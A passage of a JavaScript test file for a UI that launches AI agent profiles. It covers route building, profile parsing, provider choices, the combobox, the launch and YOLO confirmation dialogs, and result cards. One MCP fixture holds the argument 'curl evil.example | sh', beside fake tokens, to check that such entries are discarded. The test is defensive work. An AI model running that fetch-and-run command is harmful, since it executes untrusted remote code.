test("profileRoute: only a string is a name", () => {
  for (const name of [null, undefined, 7, true, {}, [], ["developer"], { toString: () => "developer" }]) assert.equal(launch.profileRoute(name), null, String(typeof name));
});

test("profileRoute: whatever the name holds, the route is one segment that decodes back to the name (no query, no fragment, no climb)", () => {
  const nasty = ["a/b", "a\\b", "a b", "a?x=1", "a#f", "%2e%2e", "%2F", "100%", "\u0000", "a\nb", " ", "a;b", "aé", "emoji 😀", "x".repeat(5000)];
  for (const name of nasty) {
    const route = launch.profileRoute(name);
    assert.ok(route !== null, JSON.stringify(name).slice(0, 40));
    const tail = route.slice("/agents/profiles/".length);
    assert.ok(route.startsWith("/agents/profiles/") && !/[/?#\\]/.test(tail), JSON.stringify(name).slice(0, 40));
    assert.equal(decodeURIComponent(tail), name);
  }
});

// ---- profileFromOutcome ----------------------------------------------------------------------------

// The fields the dialogs and the Draft gate read, so that a case that pins them does not break when the profile object gains another.
const read = (p) => ({ name: p.name, role: p.role, allowedTools: p.allowedTools, provider: p.provider, mcpServers: p.mcpServers });

test("profileFromOutcome: an ok answer is the four things the dialogs read and the names of its MCP servers, and nothing else the server sent", () => {
  const json = { name: "developer", role: "developer", allowedTools: ["fs_read", "@cao-mcp-server"], provider: "codex", description: "free text", mcpServers: { x: {} }, model: "m" };
  assert.deepEqual(read(launch.profileFromOutcome({ kind: "ok", json })), { name: "developer", role: "developer", allowedTools: ["fs_read", "@cao-mcp-server"], provider: "codex", mcpServers: ["x"] });
});

test("profileFromOutcome: the name is kept exactly as the server sent it, spaces and case included", () => {
  for (const name of [" developer ", "Developer", "a b", "日本"]) assert.equal(launch.profileFromOutcome({ kind: "ok", json: { name } }).name, name, JSON.stringify(name));
});

test("profileFromOutcome: any outcome that is not an ok answer is null", () => {
  const json = { name: "developer" };
  for (const kind of ["unreachable", "auth", "refused", "too_large", "error", "", undefined]) assert.equal(launch.profileFromOutcome({ kind, json, status: 404, detail: "x" }), null, String(kind));
  for (const o of [null, undefined, "ok", 7, {}, []]) assert.equal(launch.profileFromOutcome(o), null, JSON.stringify(o));
});

test("profileFromOutcome: an answer without a usable name is null, whatever else it holds", () => {
  for (const json of [null, undefined, "developer", 7, [], [{ name: "developer" }], {}, { name: "" }, { name: 7 }, { name: null }, { role: "r", allowedTools: ["a"] }, Object.assign(["a"], { name: "developer" })]) {
    assert.equal(launch.profileFromOutcome({ kind: "ok", json }), null, JSON.stringify(json));
  }
});

test("profileFromOutcome: role and provider that are empty or not text are null; the server omits them when it has none", () => {
  const p = launch.profileFromOutcome({ kind: "ok", json: { name: "n" } });
  assert.deepEqual(read(p), { name: "n", role: null, allowedTools: null, provider: null, mcpServers: [] });
  for (const bad of ["", 7, null, false, {}, ["codex"]]) {
    const q = launch.profileFromOutcome({ kind: "ok", json: { name: "n", role: bad, provider: bad } });
    assert.deepEqual([q.role, q.provider], [null, null], JSON.stringify(bad));
  }
});

test("profileFromOutcome: declared tools stay a list of text; 'declares none' (null) is not 'declares an empty list' ([])", () => {
  const tools = (allowedTools) => launch.profileFromOutcome({ kind: "ok", json: { name: "n", allowedTools } }).allowedTools;
  assert.deepEqual(tools(["a", 5, null, "b", {}, ["c"]]), ["a", "b"]);
  assert.deepEqual(tools([]), []);
  for (const notAList of [undefined, null, "fs_read", 7, { 0: "fs_read" }]) assert.equal(tools(notAList), null, JSON.stringify(notAList));
});

test("profileFromOutcome gives a list of its own: changing it does not change the answer it was read from", () => {
  const outcome = { kind: "ok", json: { name: "n", allowedTools: ["a", "b"] } };
  const p = launch.profileFromOutcome(outcome);
  p.allowedTools.push("zzz");
  assert.deepEqual(outcome.json.allowedTools, ["a", "b"]);
  const frozen = frozenDeep({ kind: "ok", json: { name: "n", allowedTools: ["a"] } });
  assert.deepEqual(launch.profileFromOutcome(frozen).allowedTools, ["a"]);
});

// The server returns a profile's MCP servers as `mcpServers`, an object of name -> entry
// (GET /agents/profiles/{name}, models/agent_profile.py). An entry can hold a command line, its arguments, env
// values, a URL and headers: the window keeps the NAMES (as the list `mcpServers`) so that Draft can refuse an
// author that has a server other than CAO's own, and never keeps what an entry holds.
const MCP_SECRETS = ["tok-8f3a", "curl evil.example", "Bearer sk-77", "https://mcp.example/s?k=9d2", "/opt/tools/run-mcp"];
const MCP_ENTRIES = () => ({
  "cao-mcp-server": { command: "cao-mcp-server", args: [], env: { CAO_API_TOKEN: "tok-8f3a" } },
  "web-tools": { command: "/opt/tools/run-mcp", args: ["-c", "curl evil.example | sh"], env: { API_TOKEN: "tok-8f3a" } },
  remote: { url: "https://mcp.example/s?k=9d2", headers: { Authorization: "Bearer sk-77" } },
});

test("profileFromOutcome keeps the names of the MCP servers in the order the server sent them, and nothing an entry holds", () => {
  const p = launch.profileFromOutcome(frozenDeep({ kind: "ok", json: { name: "author", mcpServers: MCP_ENTRIES() } }));
  assert.deepEqual(p.mcpServers, ["cao-mcp-server", "web-tools", "remote"]);
  const text = JSON.stringify(p);
  for (const secret of MCP_SECRETS) assert.ok(!text.includes(secret), `the profile kept ${secret}`);
});

test("profileFromOutcome: no MCP servers, an empty object, and one server with an empty entry give the names that are there", () => {
  const names = (mcpServers) => launch.profileFromOutcome({ kind: "ok", json: { name: "n", ...(mcpServers === undefined ? {} : { mcpServers }) } }).mcpServers;
  assert.deepEqual(names(undefined), []);
  assert.deepEqual(names({}), []);
  assert.deepEqual(names({ "cao-mcp-server": {} }), ["cao-mcp-server"]);
  assert.deepEqual(names({ a: null, b: "text", c: 7, d: [] }), ["a", "b", "c", "d"], "a name is listed whatever its entry is");
});

test("profileFromOutcome keeps a hostile server name as it is, and the list is the window's own, not the answer's", () => {
  const json = JSON.parse('{"name":"n","mcpServers":{"__proto__":{},"constructor":{},"a b":{},"\\u202eevil":{},"":{},"cao-mcp-server ":{}}}');
  const p = launch.profileFromOutcome({ kind: "ok", json });
  assert.deepEqual(p.mcpServers, ["__proto__", "constructor", "a b", "\u202eevil", "", "cao-mcp-server "]);
  p.mcpServers.push("zzz");
  assert.deepEqual(Object.keys(json.mcpServers), ["__proto__", "constructor", "a b", "\u202eevil", "", "cao-mcp-server "], "changing the list did not change the answer");
});

test("profileFromOutcome keeps nothing of an mcpServers that is not an object, and does not throw on it", () => {
  for (const mcpServers of ["tok-8f3a", ["tok-8f3a", { env: { K: "tok-8f3a" } }], 7, true, false, "", null]) {
    const p = launch.profileFromOutcome(frozenDeep({ kind: "ok", json: { name: "n", mcpServers } }));
    assert.equal(p.name, "n", JSON.stringify(mcpServers));
    assert.ok(!JSON.stringify(p).includes("tok-8f3a"), JSON.stringify(mcpServers));
  }
});

test("profileFromOutcome keeps nothing of a native_agent value, whatever it is", () => {
  for (const native_agent of ["reviewer-native-9", " reviewer-native-9 ", ["reviewer-native-9"], { n: "reviewer-native-9" }]) {
    const p = launch.profileFromOutcome(frozenDeep({ kind: "ok", json: { name: "n", native_agent } }));
    assert.equal(p.name, "n");
    assert.ok(!JSON.stringify(p).includes("reviewer-native-9"), JSON.stringify(native_agent));
  }
});

// The server returns `native_agent` (a string, the name of a Claude agent file that holds the profile's MCP
// configuration) only when the profile sets it. Draft refuses such a profile, so the profile object keeps a yes or
// no, `nativeAgent`, and never the name.
test("profileFromOutcome says whether native_agent is set as a plain true or false: set for any value but absent, null, an empty string and false", () => {
  const flag = (native_agent, has = true) => launch.profileFromOutcome({ kind: "ok", json: { name: "n", ...(has ? { native_agent } : {}) } }).nativeAgent;
  for (const v of ["reviewer-native-9", "x", " ", "a b", true, "\u202e"]) assert.strictEqual(flag(v), true, JSON.stringify(v));
  assert.strictEqual(flag(undefined, false), false, "absent");
  for (const v of [null, "", false]) assert.strictEqual(flag(v), false, JSON.stringify(v));
});

// ---- providerChoices -------------------------------------------------------------------------------

test("providerChoices: every provider the server lists, in its order, with the uninstalled ones marked", () => {
  const rows = [{ name: "claude_code", binary: "claude", installed: true }, { name: "codex", binary: "codex", installed: false }, { name: "hermes", binary: "hermes" }];
  const c = launch.providerChoices(rows, null);
  assert.deepEqual(c.options, [
    { name: "claude_code", installed: true, label: "claude_code" },
    { name: "codex", installed: false, label: "codex (not installed)" },
    { name: "hermes", installed: false, label: "hermes (not installed)" },
  ]);
});

test("providerChoices: only an installed value of true counts as installed", () => {
  const c = launch.providerChoices([{ name: "a", installed: "true" }, { name: "b", installed: 1 }, { name: "c", installed: null }, { name: "d", installed: true }], null);
  assert.deepEqual(c.options.map((o) => o.installed), [false, false, false, true]);
});

test("providerChoices: the default is the profile's provider, else kiro_cli, and the text says whose it is", () => {
  const none = launch.providerChoices([], null);
  assert.deepEqual([none.defaultName, none.defaultText], ["kiro_cli", "Default: kiro_cli"]);
  const own = launch.providerChoices([], { provider: "codex" });
  assert.deepEqual([own.defaultName, own.defaultText], ["codex", "Default: codex (the profile's)"]);
  for (const profile of [undefined, {}, { provider: null }, { provider: "codex" }, { provider: "claude_code" }]) {
    assert.equal(launch.providerChoices([], profile).defaultName, launch.resolvedProvider(form(), profile), `the default shown is the one the form resolves: ${JSON.stringify(profile)}`);
  }
  assert.deepEqual(launch.providerChoices([], undefined).defaultName, "kiro_cli", "no profile argument");
});

test("providerChoices: no list, a malformed list or a row without a name gives no option, and never throws", () => {
  for (const rows of [null, undefined, "codex", 7, {}, [], { a: { name: "codex", installed: true } }]) assert.deepEqual(launch.providerChoices(rows, null).options, [], JSON.stringify(rows));
  const c = launch.providerChoices([null, undefined, {}, { name: "" }, { name: 7 }, { name: "ok", installed: true }, 5, "x"], null);
  assert.deepEqual(c.options.map((o) => o.name), ["ok"]);
});

test("providerChoices does not change its rows, and its options are its own", () => {
  const rows = frozenDeep([{ name: "codex", installed: false }]);
  const c = launch.providerChoices(rows, frozenDeep({ provider: "codex" }));
  c.options[0].label = "changed";
  assert.equal(rows[0].name, "codex");
  assert.equal(launch.providerChoices(rows, null).options[0].label, "codex (not installed)");
});

// ---- profileMatches --------------------------------------------------------------------------------

const PROFILE_ROWS = frozenDeep(["developer", "Reviewer", "code_supervisor", "kiro-dev", "École"].map((name) => ({ name, loadable: true })));
const namesOf = (rows) => rows.map((r) => r.name);

test("profileMatches: rows whose name contains the typed text, in any case, in the server's order", () => {
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "DEV")), ["developer", "kiro-dev"]);
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "view")), ["Reviewer"]);
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "developer")), ["developer"], "the whole name matches");
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "éCOLE")), ["École"], "case folds beyond ASCII");
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "nothing like it")), []);
});

test("profileMatches: nothing typed (or only spaces) lists every row; the typed text is trimmed", () => {
  for (const filter of ["", "   ", null, undefined]) assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, filter)), namesOf(PROFILE_ROWS), JSON.stringify(filter));
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "  dev  ")), ["developer", "kiro-dev"]);
  assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, "code super")), [], "a space inside is a space the name must hold");
});

test("profileMatches: the typed text is text, never a pattern", () => {
  for (const filter of [".*", "(", "[a-", "\\", "^developer$", "dev|rev", "*", "?", "+"]) assert.deepEqual(namesOf(launch.profileMatches(PROFILE_ROWS, filter)), [], filter);
  assert.deepEqual(namesOf(launch.profileMatches([{ name: "a.b" }, { name: "axb" }], ".")), ["a.b"]);
  assert.deepEqual(launch.profileMatches(PROFILE_ROWS, "x".repeat(100000)), [], "a very long text finds nothing and does not throw");
});

test("profileMatches: at most `limit` rows, counted over the matches and not over the rows; 8 by default", () => {
  const rows = Array.from({ length: 20 }, (_, i) => ({ name: `p${String(i).padStart(2, "0")}` }));
  assert.equal(launch.profileMatches(rows, "").length, 8);
  assert.deepEqual(namesOf(launch.profileMatches(rows, "", 3)), ["p00", "p01", "p02"]);
  assert.equal(launch.profileMatches(rows, "", 20).length, 20, "limit equal to the count");
  assert.equal(launch.profileMatches(rows, "", 21).length, 20, "limit over the count");
  assert.equal(launch.profileMatches(rows, "", 1).length, 1);
  assert.deepEqual(launch.profileMatches(rows, "", 0), [], "limit 0");
  assert.deepEqual(namesOf(launch.profileMatches(rows, "p1", 20)), ["p10", "p11", "p12", "p13", "p14", "p15", "p16", "p17", "p18", "p19"]);
  assert.deepEqual(namesOf(launch.profileMatches(rows, "p19")), ["p19"], "a match past the first 8 rows is found");
  assert.equal(launch.profileMatches(rows, "p1").length, 8, "10 matches, 8 shown");
});

test("profileMatches: gives the rows themselves, changes none, and a missing list is no match", () => {
  const out = launch.profileMatches(PROFILE_ROWS, "dev");
  assert.equal(out[0], PROFILE_ROWS[0]);
  for (const rows of [null, undefined, "developer", 7, {}, { a: { name: "developer" } }]) assert.deepEqual(launch.profileMatches(rows, "dev"), []);
});

test("the combobox pipeline (profilesForForm, then profileMatches) offers only loadable, non-dot names and survives junk rows", () => {
  const rows = [null, { loadable: true }, { name: 7, loadable: true }, { name: "developer", loadable: true }, { name: "README", loadable: false }, { name: ".backup", loadable: true }, { name: "dev-two", loadable: true }];
  for (const filter of ["", "dev", "backup", "readme"]) assert.doesNotThrow(() => launch.profileMatches(launch.profilesForForm(rows), filter), filter);
  assert.deepEqual(namesOf(launch.profileMatches(launch.profilesForForm(rows), "dev")), ["developer", "dev-two"]);
  assert.deepEqual(launch.profileMatches(launch.profilesForForm(rows), "backup"), []);
  assert.deepEqual(launch.profileMatches(launch.profilesForForm(rows), "readme"), []);
});

// ---- comboStep -------------------------------------------------------------------------------------

test("comboStep: Up and Down move one match and do not wrap; Home and End jump to the ends", () => {
  const at = (index, key, count = 3) => launch.comboStep({ index }, count, key);
  assert.deepEqual(at(0, "ArrowDown"), { index: 1, action: null });
  assert.deepEqual(at(1, "ArrowDown"), { index: 2, action: null });
  assert.deepEqual(at(2, "ArrowDown"), { index: 2, action: null }, "Down at the last match stays");
  assert.deepEqual(at(2, "ArrowUp"), { index: 1, action: null });
  assert.deepEqual(at(1, "ArrowUp"), { index: 0, action: null });
  assert.deepEqual(at(0, "ArrowUp"), { index: 0, action: null }, "Up at the first match stays");
  assert.deepEqual(at(1, "Home"), { index: 0, action: null });
  assert.deepEqual(at(1, "End"), { index: 2, action: null });
  assert.deepEqual(at(0, "End", 1), { index: 0, action: null });
});

test("comboStep: Enter chooses the highlighted match; Esc closes the list; neither moves the highlight", () => {
  assert.deepEqual(launch.comboStep({ index: 1 }, 3, "Enter"), { index: 1, action: "choose" });
  assert.deepEqual(launch.comboStep({ index: 0 }, 1, "Enter"), { index: 0, action: "choose" });
  for (const esc of ["Escape", "Esc", "escape"]) assert.deepEqual(launch.comboStep({ index: 2 }, 3, esc), { index: 2, action: "close" }, esc);
  assert.deepEqual(launch.comboStep({ index: 0 }, 0, "Escape"), { index: 0, action: "close" }, "Esc closes an empty list too");
});

test("comboStep: Enter with no match chooses nothing", () => {
  for (const state of [{ index: 0 }, { index: 3 }, undefined]) assert.equal(launch.comboStep(state, 0, "Enter").action, null);
  assert.equal(launch.comboStep({ index: 0 }, -1, "Enter").action, null, "a count below 0 is no match");
});

test("comboStep: the key may come as ArrowDown, Down or down, in any case", () => {
  for (const key of ["ArrowDown", "arrowdown", "Down", "DOWN", "down"]) assert.equal(launch.comboStep({ index: 0 }, 3, key).index, 1, key);
  for (const key of ["ArrowUp", "Up", "up", "UP"]) assert.equal(launch.comboStep({ index: 2 }, 3, key).index, 1, key);
  for (const key of ["HOME", "home"]) assert.equal(launch.comboStep({ index: 2 }, 3, key).index, 0, key);
  for (const key of ["END", "end"]) assert.equal(launch.comboStep({ index: 0 }, 3, key).index, 2, key);
  for (const key of ["ENTER", "enter"]) assert.equal(launch.comboStep({ index: 0 }, 3, key).action, "choose", key);
});

test("comboStep: any other key changes nothing and acts on nothing", () => {
  for (const key of ["a", "Tab", "PageDown", "Delete", " ", "", null, undefined, 7, "ArrowLeft", "Down Arrow", "DownArrow", "ArrowArrowDown", "downs"]) {
    assert.deepEqual(launch.comboStep({ index: 1 }, 3, key), { index: 1, action: null }, JSON.stringify(key));
  }
});

test("comboStep: a highlight past the list (the list shrank as the user typed) comes back inside it, so Enter never chooses a match that is gone", () => {
  assert.deepEqual(launch.comboStep({ index: 5 }, 2, "Enter"), { index: 1, action: "choose" });
  assert.deepEqual(launch.comboStep({ index: 9 }, 3, "x"), { index: 2, action: null });
  assert.deepEqual(launch.comboStep({ index: -4 }, 3, "x"), { index: 0, action: null });
  assert.deepEqual(launch.comboStep({ index: 9 }, 3, "ArrowDown"), { index: 2, action: null });
  for (const state of [undefined, null, {}, { index: undefined }, { index: null }]) assert.deepEqual(launch.comboStep(state, 3, "x"), { index: 0, action: null }, JSON.stringify(state));
  for (const key of ["ArrowDown", "ArrowUp", "Home", "End", "x"]) assert.equal(launch.comboStep({ index: 0 }, 0, key).index, 0, `an empty list: ${key}`);
});

test("comboStep: whatever the list and the key, the highlight stays inside the list", () => {
  const keys = ["ArrowDown", "ArrowUp", "Home", "End", "Enter", "Escape", "x"];
  for (let count = 0; count <= 5; count++) {
    for (let index = -2; index <= 7; index++) {
      for (const key of keys) {
        const r = launch.comboStep({ index }, count, key);
        assert.ok(Number.isInteger(r.index) && r.index >= 0 && r.index <= Math.max(count - 1, 0), `count ${count}, index ${index}, ${key} -> ${r.index}`);
      }
    }
  }
});

test("comboStep: a state that can be changed is not changed either", () => {
  for (const [index, count, key] of [[9, 3, "x"], [-4, 3, "ArrowUp"], [1, 3, "ArrowDown"], [0, 3, "End"], [5, 2, "Enter"]]) {
    const state = { index };
    const r = launch.comboStep(state, count, key);
    assert.deepEqual(state, { index }, `${index} ${key}`);
    assert.notEqual(r, state);
  }
});

test("comboStep: the state it is given is not changed, and a new one comes back", () => {
  const state = Object.freeze({ index: 1 });
  const r = launch.comboStep(state, 3, "ArrowDown");
  assert.notEqual(r, state);
  assert.equal(state.index, 1);
  let at = { index: 0 };
  for (let i = 0; i < 10; i++) at = launch.comboStep(at, 4, "ArrowDown");
  assert.equal(at.index, 3);
  for (let i = 0; i < 10; i++) at = launch.comboStep(at, 4, "ArrowUp");
  assert.equal(at.index, 0);
});

// ---- launchDialog ----------------------------------------------------------------------------------

test("Native provider: the Ask-first dialog shows the declared tools, labelled as declared, and says the provider refuses blocked tools", () => {
  const d = askOf();
  assert.equal(d.kind, "ask");
  assert.equal(d.title, "Launch developer on claude_code?");
  assert.equal(d.role, "developer");
  assert.deepEqual(d.tools, ["fs_read", "execute_bash"]);
  assert.equal(d.toolsText, "fs_read, execute_bash");
  assert.equal(d.toolsHeading, "Declared tools");
  assert.equal(d.toolsLabel, LABEL_DECLARED);
  assert.equal(d.enforcement, "native (the provider refuses blocked tools)");
  assert.deepEqual([d.enforced, d.notEnforcedLabel, d.overrideNote], [true, null, null]);
});

test("the Ask-first dialog starts on Cancel: a stray Enter cannot launch", () => {
  const d = askOf();
  assert.deepEqual([d.confirmLabel, d.cancelLabel, d.confirmEnabled], ["Launch", "Cancel", true]);
  assert.equal(d.defaultFocus, "cancel");
  assert.equal(logic.dialogKey({ focus: d.defaultFocus }, d, "Enter").action, "cancel");
  assert.equal(logic.dialogKey({ focus: "confirm" }, d, "Enter").action, "confirm");
});

test("Prompt-only provider: the dialog shows the declared tools and 'not enforced by this provider', and says the agent is told, not prevented", () => {
  const d = askOf({ provider: "codex" });
  assert.deepEqual(d.tools, ["fs_read", "execute_bash"]);
  assert.equal(d.toolsLabel, LABEL_DECLARED);
  assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED);
  assert.match(d.enforcement, /the agent is told, not prevented/);
  assert.equal(d.enforced, false);
});

test("a provider with no enforcement, or one the window does not know, also says 'not enforced' for a restricted policy", () => {
  for (const provider of ["hermes", "cursor_cli", "mock_cli", "nonesuch", "", undefined, "toString", "__proto__"]) {
    const d = askOf({ provider });
    assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED, String(provider));
    assert.equal(d.enforced, false, String(provider));
  }
});

test("an unrestricted policy (the profile declares '*') is not called 'not enforced': there is nothing to enforce", () => {
  const profile = { ...developer(), allowedTools: ["*"] };
  assert.equal(askOf({ provider: "codex", profile }).notEnforcedLabel, null);
  assert.equal(askOf({ provider: "claude_code", profile }).notEnforcedLabel, null);
});

test("Override on an install-time provider with Ask first: the install-time line, the override named and not presented as enforced", () => {
  for (const provider of ["kiro_cli", "opencode_cli"]) {
    const d = askOf({ provider, override: ["fs_write"] });
    assert.equal(d.enforcement, INSTALL_TIME_LINE, provider);
    assert.equal(d.enforced, false, provider);
    assert.equal(d.notEnforcedLabel, null, provider);
    assert.deepEqual([d.toolsHeading, d.toolsText, d.tools], ["Allowed tools (your override)", "fs_write", ["fs_write"]], provider);
    assert.equal(d.overrideNote, "--allowed-tools replaces the profile's policy", provider);
    assert.equal(d.toolsLabel, null, `${provider}: the override is not what the profile declared`);
  }
  assert.equal(askOf({ provider: "kiro_cli" }).enforcement, INSTALL_TIME_LINE, "the install-time line holds without an override too");
});

test("an override replaces the declared list in the dialog; no override (null, undefined or absent) shows the declared one", () => {
  const withOverride = askOf({ override: ["a", "b"] });
  assert.deepEqual([withOverride.toolsText, withOverride.toolsHeading, withOverride.overrideNote === null], ["a, b", "Allowed tools (your override)", false]);
  for (const override of [null, undefined]) {
    const d = askOf({ override });
    assert.deepEqual([d.toolsText, d.toolsHeading, d.overrideNote, d.toolsLabel], ["fs_read, execute_bash", "Declared tools", null, LABEL_DECLARED], String(override));
  }
});

test("a profile that could not be read is shown as such: no tools claimed, the dialog still opens", () => {
  const d = askOf({ profile: null, provider: "codex" });
  assert.equal(d.kind, "ask");
  assert.deepEqual([d.role, d.tools], [null, null]);
  assert.match(d.toolsText, /not known/);
  assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED, "unknown tools are treated as restricted, as the CLI does");
  assert.doesNotThrow(() => launch.launchDialog("ask"));
  assert.doesNotThrow(() => launch.launchDialog("ask", {}));
});

test("the dialog copies the tools: changing what it shows does not change the profile or the override", () => {
  const profile = frozenDeep(developer());
  const override = frozenDeep(["fs_write"]);
  const d = launch.launchDialog("ask", { profile, provider: "claude_code", override });
  d.tools.push("zzz");
  assert.deepEqual(profile.allowedTools, ["fs_read", "execute_bash"]);
  assert.deepEqual(override, ["fs_write"]);
  const y = launch.launchDialog("yolo", { profile, provider: "kiro_cli", sessionName: "s", typed: "s" });
  assert.equal(y.confirmEnabled, true);
});

test("YOLO typed confirmation: the dialog is dangerous, starts on the typed field, and Launch stays disabled until the exact session name is typed", () => {
  const d = yoloOf();
  assert.equal(d.kind, "yolo");
  assert.deepEqual([d.danger, d.defaultFocus, d.confirmPrompt, d.typedName], [true, "input", "Type the session name to confirm", "my-session"]);
  assert.deepEqual([d.confirmLabel, d.cancelLabel], ["Launch with YOLO", "Cancel"]);
  assert.match(d.title, /developer/, "the dialog names the profile it launches");
  assert.match(yoloOf({ provider: "kiro_cli" }).title, /developer/);
  assert.strictEqual(d.confirmEnabled, false, "nothing typed yet");
  assert.strictEqual(yoloOf({ typed: "my-session" }).confirmEnabled, true);
  for (const typed of ["my-sessio", "my-session ", " my-session", "My-Session", "my-session2", "other", "cao-my-session", "my‑session", "\u0000"]) {
    assert.strictEqual(yoloOf({ typed }).confirmEnabled, false, JSON.stringify(typed));
  }
});

test("a YOLO dialog never confirms without a session name, even when nothing is typed, and a missing field is not a match", () => {
  for (const [typed, sessionName] of [["", ""], [undefined, undefined], [undefined, ""], ["", undefined], [null, null], [null, "s"], [undefined, "s"]]) {
    assert.strictEqual(launch.launchDialog("yolo", { profile: developer(), provider: "claude_code", typed, sessionName }).confirmEnabled, false, `${typed} / ${sessionName}`);
  }
  assert.strictEqual(launch.launchDialog("yolo", { provider: "claude_code", typed: "日本", sessionName: "日本" }).confirmEnabled, true, "a name in any script");
  const long = "n".repeat(10000);
  assert.strictEqual(yoloOf({ typed: long, sessionName: long }).confirmEnabled, true);
  assert.strictEqual(yoloOf({ typed: `${long}x`, sessionName: long }).confirmEnabled, false);
});

test("YOLO on an install-time provider: the typed-name dialog also carries the install-time line and the CLI's note; a native provider has neither", () => {
  for (const provider of ["kiro_cli", "opencode_cli"]) {
    const d = yoloOf({ provider });
    assert.equal(d.installTime.line, INSTALL_TIME_LINE, provider);
    assert.match(d.installTime.note, /yolo/i, provider);
    assert.deepEqual(d.installTime, launch.yoloDialog(developer(), provider).installTime, provider);
    assert.doesNotMatch(d.title, /every tool/i, `${provider}: YOLO is not presented as lifting the agent's own policy`);
  }
  assert.equal(yoloOf({ provider: "claude_code" }).installTime, null);
  assert.equal(yoloOf({ provider: "codex" }).installTime, null);
});

test("launchDialog: a kind it does not know opens the Ask-first dialog, never the YOLO one", () => {
  for (const kind of ["bogus", "YOLO", "", undefined, null, 7]) assert.equal(launch.launchDialog(kind, { profile: developer(), provider: "claude_code" }).kind, "ask", String(kind));
  assert.equal(launch.launchDialog("ask", { profile: developer(), provider: "claude_code", typed: "x", sessionName: "x" }).confirmEnabled, true, "typing plays no part in the Ask-first dialog");
});

// ---- discardSpec -----------------------------------------------------------------------------------

test("Escape with typed text: the dialog asks 'Discard this form?' and its default is Keep editing", () => {
  const d = launch.discardSpec();
  assert.equal(d.title, "Discard this form?");
  assert.ok(typeof d.body === "string" && d.body !== "", "the dialog says what is lost");
  assert.deepEqual([d.cancelLabel, d.confirmLabel, d.defaultFocus, d.confirmEnabled], ["Keep editing", "Discard", "cancel", true]);
  assert.equal(logic.dialogKey({ focus: d.defaultFocus }, d, "Enter").action, "cancel", "Enter keeps editing");
  assert.equal(logic.dialogKey({ focus: d.defaultFocus }, d, "Escape").action, "cancel", "Esc keeps editing");
  assert.equal(logic.dialogKey({ focus: "cancel" }, d, "Tab").focus, "confirm");
  assert.equal(logic.dialogKey({ focus: "confirm" }, d, "Enter").action, "confirm", "Discard needs a deliberate move to it");
});

test("discardSpec hands out a new spec each time", () => {
  const a = launch.discardSpec();
  a.title = "changed";
  assert.equal(launch.discardSpec().title, "Discard this form?");
  assert.notEqual(launch.discardSpec(), launch.discardSpec());
});

test("the YOLO dialog in a dialog's hands: Enter in the typed field confirms only on the exact name; Esc always cancels", () => {
  const wrong = yoloOf({ typed: "nope" });
  const right = yoloOf({ typed: "my-session" });
  assert.equal(logic.dialogKey({ focus: wrong.defaultFocus }, wrong, "Enter").action, null);
  assert.equal(logic.dialogKey({ focus: right.defaultFocus }, right, "Enter").action, "confirm");
  assert.equal(logic.dialogKey({ focus: wrong.defaultFocus }, wrong, "Escape").action, "cancel");
  assert.equal(logic.dialogKey({ focus: "confirm" }, wrong, "Enter").action, null, "a disabled Launch with YOLO does nothing");
});

// ---- launchResultCard ------------------------------------------------------------------------------

test("Result card: a 201 shows the session name and lists the tools the server recorded, in its order", () => {
  const card = launch.launchResultCard(createdOf(), form({ message: "Run the tests" }), undefined);
  assert.equal(card.session, "cao-x");
  assert.equal(card.title, "Started cao-x.");
  assert.equal(card.toolsText, "fs_read, execute_bash");
});

test("Result card: no recorded tools is told apart from an empty list: 'not reported' is not 'none'", () => {
  const text = (json) => launch.launchResultCard(createdOf(json), form(), undefined).toolsText;
  assert.equal(text({ allowed_tools: [] }), "none");
  assert.equal(text({ allowed_tools: ["*"] }), "*");
  assert.equal(text({ allowed_tools: null }), "not reported by the server");
  assert.equal(text({ allowed_tools: undefined }), "not reported by the server");
  assert.equal(text({ allowed_tools: "fs_read" }), "not reported by the server");
});

test("Result card: a record whose tools are not a list is 'not reported', and the card does not guess", () => {
  for (const tools of ["fs_read", {}, 7, true, { length: 2 }]) {
    const card = launch.launchResultCard({ type: "created", session: "cao-x", tools, messageSent: false }, form(), undefined);
    assert.equal(card.toolsText, "not reported by the server", JSON.stringify(tools));
  }
});

test("Result card: a first message sent without --async follows the first reply; --async or no message does not", () => {
  const sent = launch.launchResultCard(createdOf(), form({ message: "Run the tests", async: false }), undefined);
  assert.equal(sent.follow, true);
  assert.match(sent.messageLine, /first message was delivered/i);
  assert.doesNotMatch(sent.messageLine, /--async/);
  assert.equal(typeof sent.replyLine, "string");

  const asyncCard = launch.launchResultCard(createdOf(), form({ message: "Run the tests", async: true }), { state: "done", turn: 1 });
  assert.deepEqual([asyncCard.follow, asyncCard.replyLine], [false, null]);
  assert.match(asyncCard.messageLine, /delivered/i);
  assert.match(asyncCard.messageLine, /--async/);

  const noMessage = launch.launchResultCard(createdOf({}, { message: "" }), form({ message: "" }), { state: "done", turn: 1 });
  assert.deepEqual([noMessage.follow, noMessage.replyLine, noMessage.messageLine], [false, null, "No first message was sent."]);
  const noMessageAsync = launch.launchResultCard(createdOf({}, { message: "" }), form({ message: "", async: true }), undefined);
  assert.deepEqual([noMessageAsync.follow, noMessageAsync.messageLine], [false, "No first message was sent."]);
});

test("Result card: what was sent is what the server was given (the created record), not what the form holds now", () => {
  const sentNothing = launch.launchResultCard(createdOf({}, { message: "" }), form({ message: "typed after launch" }), undefined);
  assert.deepEqual([sentNothing.follow, sentNothing.messageLine], [false, "No first message was sent."]);
  const sent = launch.launchResultCard(createdOf(), form({ message: "" }), undefined);
  assert.equal(sent.follow, true);
});

test("Result card: the reply line follows the agent's Herdr record (state and turn), without asking CAO", () => {
  const line = (term) => launch.launchResultCard(createdOf(), form({ message: "hi" }), term).replyLine;
  const waiting = line(undefined);
  assert.match(waiting, /waiting for the agent to start/i);
  assert.equal(line(null), waiting);
  assert.equal(line({ state: "idle", turn: 0 }), waiting, "idle at turn 0 is not a reply");
  assert.equal(line({ state: "done", turn: 0 }), waiting);
  assert.equal(line({ state: "done" }), waiting, "no turn is no reply");
  assert.equal(line({ state: "unknown", turn: 3 }), waiting);
